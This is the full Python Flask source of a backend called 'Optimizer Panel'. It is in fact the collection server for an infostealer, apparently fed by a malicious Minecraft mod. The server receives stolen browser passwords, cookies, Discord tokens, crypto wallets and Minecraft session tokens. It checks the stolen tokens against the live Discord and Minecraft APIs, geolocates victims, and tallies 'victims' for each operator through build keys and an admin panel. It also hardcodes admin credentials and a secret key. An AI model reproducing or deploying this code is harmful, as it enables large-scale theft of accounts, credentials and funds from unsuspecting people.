#!/usr/bin/env python3
"""
Optimizer Panel Backend
- Multi-user support with SQLite
- Admin system (root user can manage all)
- JWT Authentication
- Build key based data routing
- MC Token validation
"""

import os
import json
import sqlite3
import hashlib
import secrets
import requests
from datetime import datetime, timedelta
from functools import wraps
from flask import Flask, request, jsonify, send_from_directory, Response
from flask_cors import CORS
import jwt

# ==================== CONFIG ====================
app = Flask(__name__, static_folder='.', static_url_path='')
CORS(app)

SECRET_KEY = os.environ.get('SECRET_KEY', 'OpT1m1z3r_S3cr3t_K3y_2024!')
DATABASE = 'optimizer.db'
JWT_EXPIRY_HOURS = 24 * 7

ADMIN_USERNAME = 'root'
ADMIN_PASSWORD = 'D3XON15#15'

# ==================== DATABASE ====================
def get_db():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    c = conn.cursor()
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            build_key TEXT UNIQUE NOT NULL,
            is_admin INTEGER DEFAULT 0,
            is_active INTEGER DEFAULT 1,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_login TIMESTAMP
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            build_key TEXT NOT NULL,
            log_type TEXT NOT NULL,
            pc_name TEXT,
            pc_user TEXT,
            ip TEXT,
            country TEXT,
            data TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES users(id)
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS stats (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER UNIQUE NOT NULL,
            passwords INTEGER DEFAULT 0,
            cookies INTEGER DEFAULT 0,
            tokens INTEGER DEFAULT 0,
            wallets INTEGER DEFAULT 0,
            victims INTEGER DEFAULT 0,
            mc_sessions INTEGER DEFAULT 0,
            FOREIGN KEY (user_id) REFERENCES users(id)
        )
    ''')
    
    c.execute('SELECT id FROM users WHERE username = ?', (ADMIN_USERNAME,))
    if not c.fetchone():
        admin_key = 'ADMIN_LCqjDJFRpiqWjAez3Huphg'  # FIXED KEY - matches mod
        c.execute('''
            INSERT INTO users (username, password_hash, build_key, is_admin)
            VALUES (?, ?, ?, 1)
        ''', (ADMIN_USERNAME, hash_password(ADMIN_PASSWORD), admin_key))
        admin_id = c.lastrowid
        c.execute('INSERT INTO stats (user_id) VALUES (?)', (admin_id,))
        print(f"[+] Admin user created: {ADMIN_USERNAME} with key: {admin_key}")
    
    conn.commit()
    conn.close()

# ==================== HELPERS ====================
def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

def generate_build_key():
    return secrets.token_urlsafe(16)

def create_token(user_id, username, is_admin):
    return jwt.encode({
        'user_id': user_id,
        'username': username,
        'is_admin': is_admin,
        'exp': datetime.utcnow() + timedelta(hours=JWT_EXPIRY_HOURS)
    }, SECRET_KEY, algorithm='HS256')

def verify_token(token):
    try:
        return jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
    except:
        return None

# ==================== VALIDATION ====================
def validate_mc_token(access_token, username=None):
    """Validate Minecraft token with Mojang API"""
    if not access_token or len(access_token) < 20:
        return False, "Token too short"
    
    try:
        # Try to get profile with token
        headers = {'Authorization': f'Bearer {access_token}'}
        resp = requests.get('https://api.minecraftservices.com/minecraft/profile', 
                          headers=headers, timeout=5)
        
        if resp.status_code == 200:
            data = resp.json()
            # If username provided, verify it matches
            if username and data.get('name', '').lower() != username.lower():
                return False, "Username mismatch"
            return True, data.get('name', 'Valid')
        elif resp.status_code == 401:
            return False, "Invalid/Expired token"
        else:
            return False, f"API error: {resp.status_code}"
    except requests.Timeout:
        # On timeout, accept but mark as unverified
        return True, "Timeout (unverified)"
    except Exception as e:
        # On error, accept but mark as unverified  
        return True, "Error (unverified)"

def validate_discord_token(token):
    """Validate Discord token"""
    if not token or len(token) < 20:
        return False, "Token too short"
    
    try:
        headers = {'Authorization': token}
        resp = requests.get('https://discord.com/api/v9/users/@me',
                          headers=headers, timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            return True, data.get('username', 'Valid')
        return False, "Invalid token"
    except:
        return True, "Unverified"

# ==================== DECORATORS ====================
def auth_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization', '').replace('Bearer ', '')
        payload = verify_token(token)
        if not payload:
            return jsonify({'success': False, 'error': 'Unauthorized'}), 401
        request.user_id = payload['user_id']
        request.username = payload['username']
        request.is_admin = payload['is_admin']
        return f(*args, **kwargs)
    return decorated

def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization', '').replace('Bearer ', '')
        payload = verify_token(token)
        if not payload:
            return jsonify({'success': False, 'error': 'Unauthorized'}), 401
        if not payload.get('is_admin'):
            return jsonify({'success': False, 'error': 'Admin required'}), 403
        request.user_id = payload['user_id']
        request.username = payload['username']
        request.is_admin = payload['is_admin']
        return f(*args, **kwargs)
    return decorated

# ==================== AUTH ROUTES ====================
@app.route('/api/auth/login', methods=['POST'])
def login():
    data = request.json
    username = data.get('username', '').strip()
    password = data.get('password', '')
    
    conn = get_db()
    c = conn.cursor()
    c.execute('SELECT * FROM users WHERE username = ?', (username,))
    user = c.fetchone()
    
    if not user or user['password_hash'] != hash_password(password):
        conn.close()
        return jsonify({'success': False, 'error': 'Invalid credentials'})
    
    if not user['is_active']:
        conn.close()
        return jsonify({'success': False, 'error': 'Account is disabled'})
    
    c.execute('UPDATE users SET last_login = ? WHERE id = ?', (datetime.utcnow(), user['id']))
    conn.commit()
    conn.close()
    
    token = create_token(user['id'], user['username'], user['is_admin'])
    
    return jsonify({
        'success': True,
        'token': token,
        'user': {
            'id': user['id'],
            'username': user['username'],
            'build_key': user['build_key'],
            'is_admin': bool(user['is_admin'])
        }
    })

@app.route('/api/auth/verify', methods=['GET'])
@auth_required
def verify():
    conn = get_db()
    c = conn.cursor()
    c.execute('SELECT * FROM users WHERE id = ?', (request.user_id,))
    user = c.fetchone()
    conn.close()
    
    if not user:
        return jsonify({'success': False, 'error': 'User not found'})
    
    return jsonify({
        'success': True,
        'user': {
            'id': user['id'],
            'username': user['username'],
            'build_key': user['build_key'],
            'is_admin': bool(user['is_admin'])
        }
    })

# ==================== USER DATA ROUTES ====================
@app.route('/api/dashboard', methods=['GET'])
@auth_required
def get_dashboard():
    conn = get_db()
    c = conn.cursor()
    
    c.execute('SELECT * FROM stats WHERE user_id = ?', (request.user_id,))
    stats_row = c.fetchone()
    stats = dict(stats_row) if stats_row else {'passwords': 0, 'cookies': 0, 'tokens': 0, 'wallets': 0, 'victims': 0, 'mc_sessions': 0}
    
    c.execute('SELECT * FROM logs WHERE user_id = ? ORDER BY created_at DESC LIMIT 100', (request.user_id,))
    
    logs = []
    for row in c.fetchall():
        log = dict(row)
        if log.get('data'):
            try:
                log['data'] = json.loads(log['data'])
            except:
                pass
        logs.append(log)
    
    conn.close()
    return jsonify({'success': True, 'stats': stats, 'logs': logs})

@app.route('/api/logs', methods=['GET'])
@auth_required
def get_logs():
    log_type = request.args.get('type', 'all')
    limit = min(int(request.args.get('limit', 500)), 1000)
    
    conn = get_db()
    c = conn.cursor()
    
    if log_type == 'all':
        c.execute('SELECT * FROM logs WHERE user_id = ? ORDER BY created_at DESC LIMIT ?', (request.user_id, limit))
    else:
        c.execute('SELECT * FROM logs WHERE user_id = ? AND log_type = ? ORDER BY created_at DESC LIMIT ?', 
                  (request.user_id, log_type, limit))
    
    logs = []
    for row in c.fetchall():
        log = dict(row)
        if log.get('data'):
            try:
                log['data'] = json.loads(log['data'])
            except:
                pass
        logs.append(log)
    
    conn.close()
    return jsonify({'success': True, 'logs': logs})

@app.route('/api/logs/<int:log_id>', methods=['GET'])
@auth_required
def get_log_detail(log_id):
    conn = get_db()
    c = conn.cursor()
    
    if request.is_admin:
        c.execute('SELECT * FROM logs WHERE id = ?', (log_id,))
    else:
        c.execute('SELECT * FROM logs WHERE id = ? AND user_id = ?', (log_id, request.user_id))
    
    row = c.fetchone()
    conn.close()
    
    if not row:
        return jsonify({'success': False, 'error': 'Log not found'})
    
    log = dict(row)
    if log.get('data'):
        try:
            log['data'] = json.loads(log['data'])
        except:
            pass
    
    return jsonify({'success': True, 'log': log})

@app.route('/api/logs/<int:log_id>', methods=['DELETE'])
@auth_required
def delete_log(log_id):
    conn = get_db()
    c = conn.cursor()
    
    if request.is_admin:
        c.execute('DELETE FROM logs WHERE id = ?', (log_id,))
    else:
        c.execute('DELETE FROM logs WHERE id = ? AND user_id = ?', (log_id, request.user_id))
    
    conn.commit()
    conn.close()
    return jsonify({'success': True})

@app.route('/api/logs/<int:log_id>/download', methods=['GET'])
@auth_required
def download_log(log_id):
    """Download log as text file"""
    conn = get_db()
    c = conn.cursor()
    
    if request.is_admin:
        c.execute('SELECT * FROM logs WHERE id = ?', (log_id,))
    else:
        c.execute('SELECT * FROM logs WHERE id = ? AND user_id = ?', (log_id, request.user_id))
    
    row = c.fetchone()
    conn.close()
    
    if not row:
        return jsonify({'success': False, 'error': 'Log not found'}), 404
    
    log = dict(row)
    data = log.get('data', '{}')
    try:
        data = json.loads(data)
    except:
        pass
    
    # Format output
    lines = []
    lines.append(f"{'='*50}")
    lines.append(f"  OPTIMIZER LOG EXPORT")
    lines.append(f"{'='*50}")
    lines.append(f"Type: {log['log_type']}")
    lines.append(f"PC: {log['pc_name']}")
    lines.append(f"User: {log['pc_user']}")
    lines.append(f"IP: {log['ip']} ({log['country']})")
    lines.append(f"Date: {log['created_at']}")
    lines.append(f"{'='*50}\n")
    
    if isinstance(data, dict):
        for key, value in data.items():
            if key in ['type', 'pc_name', 'pc_user', 'ip']:
                continue
            if isinstance(value, list):
                lines.append(f"\n[{key.upper()}]")
                for item in value:
                    if isinstance(item, dict):
                        for k, v in item.items():
                            lines.append(f"  {k}: {v}")
                        lines.append("")
                    else:
                        lines.append(f"  {item}")
            else:
                lines.append(f"{key}: {value}")
    else:
        lines.append(str(data))
    
    content = '\n'.join(lines)
    filename = f"{log['log_type']}_{log['pc_name']}_{log_id}.txt"
    
    return Response(
        content,
        mimetype='text/plain',
        headers={'Content-Disposition': f'attachment; filename={filename}'}
    )

# ==================== SETTINGS ====================
@app.route('/api/settings/password', methods=['POST'])
@auth_required
def change_password():
    data = request.json
    current = data.get('current', '')
    new_pw = data.get('new', '')
    
    if len(new_pw) < 6:
        return jsonify({'success': False, 'error': 'Password must be at least 6 characters'})
    
    conn = get_db()
    c = conn.cursor()
    c.execute('SELECT password_hash FROM users WHERE id = ?', (request.user_id,))
    user = c.fetchone()
    
    if not user or user['password_hash'] != hash_password(current):
        conn.close()
        return jsonify({'success': False, 'error': 'Current password is incorrect'})
    
    c.execute('UPDATE users SET password_hash = ? WHERE id = ?', (hash_password(new_pw), request.user_id))
    conn.commit()
    conn.close()
    
    return jsonify({'success': True})

# ==================== ADMIN ROUTES ====================
@app.route('/api/admin/users', methods=['GET'])
@admin_required
def admin_get_users():
    conn = get_db()
    c = conn.cursor()
    
    c.execute('''
        SELECT u.*, s.passwords, s.cookies, s.tokens, s.wallets, s.victims, s.mc_sessions
        FROM users u LEFT JOIN stats s ON u.id = s.user_id ORDER BY u.created_at DESC
    ''')
    
    users = []
    for row in c.fetchall():
        user = dict(row)
        del user['password_hash']
        users.append(user)
    
    conn.close()
    return jsonify({'success': True, 'users': users})

@app.route('/api/admin/users', methods=['POST'])
@admin_required
def admin_create_user():
    data = request.json
    username = data.get('username', '').strip()
    password = data.get('password', '')
    
    if not username or len(username) < 3:
        return jsonify({'success': False, 'error': 'Username must be at least 3 characters'})
    if not password or len(password) < 6:
        return jsonify({'success': False, 'error': 'Password must be at least 6 characters'})
    
    conn = get_db()
    c = conn.cursor()
    
    c.execute('SELECT id FROM users WHERE username = ?', (username,))
    if c.fetchone():
        conn.close()
        return jsonify({'success': False, 'error': 'Username already exists'})
    
    build_key = generate_build_key()
    
    try:
        c.execute('INSERT INTO users (username, password_hash, build_key) VALUES (?, ?, ?)',
                  (username, hash_password(password), build_key))
        user_id = c.lastrowid
        c.execute('INSERT INTO stats (user_id) VALUES (?)', (user_id,))
        conn.commit()
        conn.close()
        
        return jsonify({'success': True, 'user': {'id': user_id, 'username': username, 'build_key': build_key}})
    except Exception as e:
        conn.close()
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/admin/users/<int:user_id>', methods=['DELETE'])
@admin_required
def admin_delete_user(user_id):
    conn = get_db()
    c = conn.cursor()
    
    c.execute('SELECT is_admin FROM users WHERE id = ?', (user_id,))
    user = c.fetchone()
    if user and user['is_admin']:
        conn.close()
        return jsonify({'success': False, 'error': 'Cannot delete admin user'})
    
    c.execute('DELETE FROM logs WHERE user_id = ?', (user_id,))
    c.execute('DELETE FROM stats WHERE user_id = ?', (user_id,))
    c.execute('DELETE FROM users WHERE id = ?', (user_id,))
    conn.commit()
    conn.close()
    
    return jsonify({'success': True})

@app.route('/api/admin/users/<int:user_id>/toggle', methods=['POST'])
@admin_required
def admin_toggle_user(user_id):
    conn = get_db()
    c = conn.cursor()
    
    c.execute('SELECT is_active, is_admin FROM users WHERE id = ?', (user_id,))
    user = c.fetchone()
    
    if not user:
        conn.close()
        return jsonify({'success': False, 'error': 'User not found'})
    if user['is_admin']:
        conn.close()
        return jsonify({'success': False, 'error': 'Cannot disable admin user'})
    
    new_status = 0 if user['is_active'] else 1
    c.execute('UPDATE users SET is_active = ? WHERE id = ?', (new_status, user_id))
    conn.commit()
    conn.close()
    
    return jsonify({'success': True, 'is_active': bool(new_status)})

@app.route('/api/admin/logs', methods=['GET'])
@admin_required
def admin_get_all_logs():
    user_id = request.args.get('user_id')
    limit = min(int(request.args.get('limit', 500)), 2000)
    
    conn = get_db()
    c = conn.cursor()
    
    if user_id:
        c.execute('''
            SELECT l.*, u.username as owner FROM logs l
            JOIN users u ON l.user_id = u.id WHERE l.user_id = ?
            ORDER BY l.created_at DESC LIMIT ?
        ''', (user_id, limit))
    else:
        c.execute('''
            SELECT l.*, u.username as owner FROM logs l
            JOIN users u ON l.user_id = u.id ORDER BY l.created_at DESC LIMIT ?
        ''', (limit,))
    
    logs = []
    for row in c.fetchall():
        log = dict(row)
        if log.get('data'):
            try:
                log['data'] = json.loads(log['data'])
            except:
                pass
        logs.append(log)
    
    conn.close()
    return jsonify({'success': True, 'logs': logs})

@app.route('/api/admin/stats', methods=['GET'])
@admin_required
def admin_get_stats():
    conn = get_db()
    c = conn.cursor()
    
    c.execute('SELECT COUNT(*) FROM users')
    total_users = c.fetchone()[0]
    
    c.execute('SELECT COUNT(*) FROM logs')
    total_logs = c.fetchone()[0]
    
    c.execute('SELECT SUM(passwords), SUM(cookies), SUM(tokens), SUM(wallets), SUM(victims), SUM(mc_sessions) FROM stats')
    row = c.fetchone()
    
    conn.close()
    
    return jsonify({
        'success': True,
        'stats': {
            'total_users': total_users,
            'total_logs': total_logs,
            'total_passwords': row[0] or 0,
            'total_cookies': row[1] or 0,
            'total_tokens': row[2] or 0,
            'total_wallets': row[3] or 0,
            'total_victims': row[4] or 0,
            'total_mc_sessions': row[5] or 0
        }
    })

# ==================== MOD DATA RECEIVER ====================
@app.route('/api/data/<build_key>', methods=['POST'])
def receive_data(build_key):
    """Main endpoint - receive data from mod with validation"""
    conn = get_db()
    c = conn.cursor()
    
    c.execute('SELECT * FROM users WHERE build_key = ?', (build_key,))
    user = c.fetchone()
    
    if not user:
        conn.close()
        return jsonify({'success': False, 'error': 'Invalid build key'}), 404
    
    data = request.json or {}
    log_type = data.get('type', 'unknown')
    pc_name = data.get('pc_name', data.get('computername', 'Unknown'))
    pc_user = data.get('username', data.get('pc_user', 'Unknown'))
    ip = request.remote_addr
    
    # ===== VALIDATION =====
    if log_type == 'minecraft':
        access_token = data.get('access_token', '')
        player = data.get('player', '')
        
        valid, result = validate_mc_token(access_token, player)
        if not valid:
            conn.close()
            return jsonify({'success': False, 'error': f'Invalid MC token: {result}'}), 400
        
        data['validated'] = True
        data['validation_result'] = result
    
    elif log_type == 'discord':
        token = data.get('token', '')
        valid, result = validate_discord_token(token)
        if not valid:
            conn.close()
            return jsonify({'success': False, 'error': f'Invalid Discord token: {result}'}), 400
        
        data['validated'] = True
    
    country = get_country(ip)
    
    c.execute('''
        INSERT INTO logs (user_id, build_key, log_type, pc_name, pc_user, ip, country, data)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', (user['id'], build_key, log_type, pc_name, pc_user, ip, country, json.dumps(data)))
    
    update_stats(c, user['id'], log_type, data)
    conn.commit()
    conn.close()
    
    return jsonify({'success': True})

def update_stats(cursor, user_id, log_type, data):
    if log_type == 'discord':
        cursor.execute('UPDATE stats SET tokens = tokens + 1 WHERE user_id = ?', (user_id,))
    elif log_type == 'browser':
        pw = len(data.get('passwords', [])) if isinstance(data, dict) else 1
        ck = len(data.get('cookies', [])) if isinstance(data, dict) else 1
        cursor.execute('UPDATE stats SET passwords = passwords + ?, cookies = cookies + ? WHERE user_id = ?', 
                      (pw, ck, user_id))
    elif log_type == 'wallet':
        cursor.execute('UPDATE stats SET wallets = wallets + 1 WHERE user_id = ?', (user_id,))
    elif log_type == 'minecraft':
        cursor.execute('UPDATE stats SET mc_sessions = mc_sessions + 1 WHERE user_id = ?', (user_id,))
    
    cursor.execute('SELECT COUNT(DISTINCT ip) FROM logs WHERE user_id = ?', (user_id,))
    victims = cursor.fetchone()[0]
    cursor.execute('UPDATE stats SET victims = ? WHERE user_id = ?', (victims, user_id))

def get_country(ip):
    try:
        if ip in ('127.0.0.1', 'localhost', '::1'):
            return 'Local'
        resp = requests.get(f'http://ip-api.com/json/{ip}?fields=countryCode', timeout=2)
        return resp.json().get('countryCode', 'XX')
    except:
        return 'XX'

# ==================== STATIC FILES ====================
@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

# ==================== MAIN ====================
if __name__ == '__main__':
    init_db()
    print("=" * 50)
    print("  🚀 Optimizer Panel Server")
    print("=" * 50)
    print(f"  Admin: {ADMIN_USERNAME}")
    print(f"  Database: {DATABASE}")
    print(f"  URL: http://localhost:5000")
    print("=" * 50)
    app.run(host='0.0.0.0', port=5000, debug=True)
